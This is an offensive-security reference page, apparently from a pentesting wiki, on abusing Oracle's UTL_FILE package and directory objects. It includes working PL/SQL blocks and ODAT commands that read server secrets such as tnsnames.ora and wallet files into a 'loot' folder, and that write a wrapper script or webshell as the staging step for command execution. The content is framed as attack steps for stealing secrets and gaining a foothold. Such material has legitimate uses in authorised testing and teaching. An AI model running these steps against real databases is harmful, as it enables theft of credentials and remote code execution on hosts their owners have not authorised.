---
title: "Oracle file access: UTL_FILE read and write"
description: "Reading and writing files on the Oracle host through the UTL_FILE package and a directory object, to steal server-side secrets or drop a wrapper script or webshell that the scheduler and external-table command-execution paths then run."
keywords:
  - UTL_FILE
  - directory object
  - ODAT
  - Oracle file write
  - Oracle file read
---

# Oracle file access

Oracle reads and writes host files as its **service account** through the **`UTL_FILE`** package, which operates on a **directory object** (a named server path). This is a primitive in its own right (stealing configuration and secrets) and the staging step for [command execution](command-execution.md): write a wrapper script for a scheduler job, or a webshell under a served path.

## Prerequisites

`UTL_FILE` needs `EXECUTE` on the package and a **directory object** pointing at the target path. With `CREATE ANY DIRECTORY` you make your own; otherwise reuse an existing one (`SELECT directory_name, directory_path FROM all_directories;`).

## Reading and writing

```sql
-- read
DECLARE f UTL_FILE.FILE_TYPE; l VARCHAR2(4000); BEGIN
  f := UTL_FILE.FOPEN('MY_DIR','tnsnames.ora','R');
  UTL_FILE.GET_LINE(f,l); DBMS_OUTPUT.PUT_LINE(l); UTL_FILE.FCLOSE(f);
END;/

-- write (drop a wrapper script or webshell)
DECLARE f UTL_FILE.FILE_TYPE; BEGIN
  f := UTL_FILE.FOPEN('MY_DIR','run.sh','W');
  UTL_FILE.PUT_LINE(f,'id > /tmp/o'); UTL_FILE.FCLOSE(f);
END;/
```

```bash
# ODAT wraps both directions
odat utlfile -s <target> -d <SID> -U user -P pass --getFile MY_DIR tnsnames.ora ./loot
odat utlfile -s <target> -d <SID> -U user -P pass --putFile MY_DIR run.sh ./run.sh
```

## Exploitation notes

- File **write** is the lever that completes the command-execution chain: the [scheduler](command-execution.md) route needs a wrapper script on disk (it cannot pass shell metacharacters), and `UTL_FILE` puts it there.
- File **read** pulls Oracle's own secrets (`tnsnames.ora`, wallet files, trace logs) and host files the service account can read, extending access to other instances.
- Writes and reads are bounded by what the **oracle service account** owns and by the directory object's path, so enumerate `all_directories` and pick a reachable one.
- `odat utlfile` handles the PL/SQL plumbing and is the fast path; the raw blocks matter when you only have SQL injection, not a session.

## Tools

- **ODAT** (`utlfile --getFile` / `--putFile`): read and write host files.
- **sqlplus**: run the `UTL_FILE` PL/SQL blocks directly.

## References

- [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
- [HackTricks: Oracle injection, file read and write](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [Oracle: UTL_FILE package](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)
